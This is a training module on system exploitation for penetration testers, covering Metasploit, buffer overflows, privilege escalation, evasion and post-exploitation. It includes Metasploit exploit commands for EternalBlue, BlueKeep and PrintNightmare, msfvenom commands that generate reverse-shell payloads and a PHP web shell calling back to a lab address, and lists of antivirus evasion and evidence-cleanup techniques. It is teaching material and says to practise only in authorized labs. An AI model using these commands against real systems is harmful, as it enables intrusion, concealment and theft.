Module 6: System Exploitation Techniques

System exploitation is the process of leveraging vulnerabilities to gain unauthorized access to target systems. This module covers common exploitation techniques, payload development, and post-exploitation activities.

Learning Objectives

  • • Master common system exploitation techniques and methodologies
  • • Understand buffer overflow exploitation and memory corruption
  • • Learn privilege escalation techniques for various operating systems
  • • Develop and deploy custom exploits and payloads
  • • Practice post-exploitation activities and persistence mechanisms
  • • Implement evasion techniques to bypass security controls

Exploitation Fundamentals

Understanding the exploitation process helps identify opportunities and develop effective attack strategies.

Exploitation Process

  • • Vulnerability Identification: Discover exploitable flaws
  • • Exploit Development: Create or modify exploits
  • • Payload Selection: Choose appropriate payload
  • • Exploit Delivery: Execute the attack
  • • Post-Exploitation: Maintain access and gather intelligence
  • • Evidence Cleanup: Remove traces of compromise

Exploit Types

  • • Remote Exploits: Network-based attacks
  • • Local Exploits: Privilege escalation
  • • Client-Side Exploits: Browser and application attacks
  • • Web Application Exploits: SQL injection, XSS
  • • Binary Exploits: Buffer overflows, format strings
  • • Social Engineering: Human-based attacks

Metasploit Framework

Metasploit is the most widely used exploitation framework, providing a comprehensive platform for developing and deploying exploits.

Metasploit Components

Exploits

Code that takes advantage of vulnerabilities in target systems

use exploit/windows/smb/ms17_010_eternalblue
Payloads

Code executed on target system after successful exploitation

set payload windows/x64/meterpreter/reverse_tcp
Auxiliary Modules

Scanning, fuzzing, and other supporting functions

use auxiliary/scanner/smb/smb_version

Buffer Overflow Exploitation

Buffer overflows represent a fundamental class of memory corruption vulnerabilities that can lead to code execution.

Stack-Based Overflows

  • • Overwrite return addresses on stack
  • • Control program execution flow
  • • Common in C/C++ applications
  • • Requires precise memory layout knowledge
  • • Defeated by modern protections (ASLR, DEP)

Heap-Based Overflows

  • • Corrupt heap metadata structures
  • • More complex exploitation techniques
  • • Application-specific vulnerabilities
  • • Require detailed heap analysis
  • • Often lead to arbitrary code execution

Windows Exploitation

Windows systems present unique exploitation opportunities through service vulnerabilities and configuration weaknesses.

Common Windows Exploits

EternalBlue (MS17-010)

SMB vulnerability allowing remote code execution

exploit/windows/smb/ms17_010_eternalblue
BlueKeep (CVE-2019-0708)

RDP vulnerability in older Windows versions

exploit/windows/rdp/cve_2019_0708_bluekeep_rce
PrintNightmare (CVE-2021-34527)

Print Spooler service vulnerability

exploit/windows/local/cve_2021_34527_printnightmare

Linux Exploitation

Linux exploitation often focuses on service vulnerabilities and privilege escalation through kernel exploits.

Service Exploits

  • • SSH Vulnerabilities: Authentication bypasses
  • • Web Server Exploits: Apache, Nginx vulnerabilities
  • • Database Exploits: MySQL, PostgreSQL flaws
  • • FTP Exploits: vsftpd, ProFTPD vulnerabilities
  • • Samba Exploits: SMB service vulnerabilities

Kernel Exploits

  • • Dirty COW: Race condition privilege escalation
  • • DirtyCred: Kernel credential corruption
  • • CVE-2022-2586: nft_object UAF vulnerability
  • • Baron Samedit: Sudo heap overflow
  • • PwnKit: Polkit privilege escalation

Web applications present a large attack surface with various injection and logic vulnerabilities.

OWASP Top 10 Exploits

Database query manipulation for data extraction

Client-side code injection in web applications

<script>alert('XSS')</script>

Operating system command execution

Privilege Escalation

Privilege escalation techniques help gain higher-level access after initial compromise.

Windows Privilege Escalation

  • • Unquoted Service Paths: Service hijacking
  • • Weak Service Permissions: Service modification
  • • DLL Hijacking: Library replacement attacks
  • • Token Impersonation: Stolen access tokens
  • • UAC Bypass: User Access Control circumvention
  • • Kernel Exploits: System-level vulnerabilities

Linux Privilege Escalation

  • • SUID/SGID Binaries: Elevated execution
  • • Sudo Misconfiguration: Command execution rights
  • • Cron Job Hijacking: Scheduled task modification
  • • PATH Manipulation: Binary replacement attacks
  • • Capabilities Abuse: Linux capability exploitation
  • • Container Escapes: Breaking out of containers

Payload Development

Custom payloads provide flexibility and can evade detection better than standard payloads.

Payload Types and Generation

Meterpreter Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe
Shellcode Generation
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python
Web Shells
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php

Evasion Techniques

Evasion techniques help bypassed security controls like antivirus, firewalls, and intrusion detection systems.

Antivirus Evasion

  • • Payload Encoding: Obfuscate malicious code
  • • Crypters/Packers: Encrypt and compress payloads
  • • Polymorphic Code: Change code signature
  • • Living off the Land: Use legitimate tools
  • • Fileless Attacks: Memory-only execution
  • • Staged Payloads: Multi-step deployment

Network Evasion

  • • Protocol Tunneling: Hide traffic in legitimate protocols
  • • Domain Fronting: Mask C2 communications
  • • Traffic Fragmentation: Split packets to avoid detection
  • • Encryption: Secure command and control channels
  • • Timing Attacks: Slow and low techniques
  • • Proxy Chains: Route through multiple proxies

Post-Exploitation Activities

Post-exploitation activities focus on maintaining access, gathering intelligence, and lateral movement.

Common Post-Exploitation Tasks

System Enumeration

Gather system information, users, and installed software

Credential Harvesting

Extract passwords, hashes, and authentication tokens

Persistence Mechanisms

Establish backdoors and maintain long-term access

Data Exfiltration

Identify and extract sensitive information

Practical Exercises

Hands-on exercises provide experience with exploitation techniques in controlled environments.

Practice using Metasploit against vulnerable targets:

Practice privilege escalation techniques:

  • • Exploit SUID binaries and misconfigurations
  • • Use kernel exploits for system-level access

Key Takeaways

System exploitation requires understanding vulnerabilities, exploit development, and post-exploitation techniques. This module covered exploitation frameworks like Metasploit, buffer overflow development, privilege escalation methods, and evasion techniques. Successful exploitation depends on thorough reconnaissance, proper tool selection, and careful execution. Always practice in authorized lab environments and understand the legal implications of exploitation techniques. Modern security controls like ASLR, DEP, and endpoint detection make exploitation more challenging, requiring sophisticated techniques and custom payload development.
